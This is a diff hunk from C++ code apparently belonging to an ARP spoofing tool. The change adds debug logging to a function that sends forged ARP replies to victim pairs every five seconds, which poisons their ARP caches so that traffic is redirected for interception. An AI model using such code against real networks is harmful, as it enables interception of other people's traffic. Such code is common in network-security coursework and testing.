@@ -342,12 +342,19 @@ bool periodAttack(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>&
 
     // send fake packet to all victim pairs periodically
     do {
+#ifdef DEBUG
+        std::cout << "[DEBUG] period attack\n";
+#endif
         for(auto a : victims) {
             ARPPacketSetting(packet, a.sendMAC, myMAC, myMAC, a.targetIP, a.sendMAC, a.sendIP);
 
             if(not sendPacket(pcap, packet)) return false;
         }
     } while(not cvPeriod.wait_for(lk, 5s, [](){ return not isEnd; }));
+
+#ifdef DEBUG
+        std::cout << "[DEBUG] period attack terminated\n";
+#endif
 
     return true;
 }
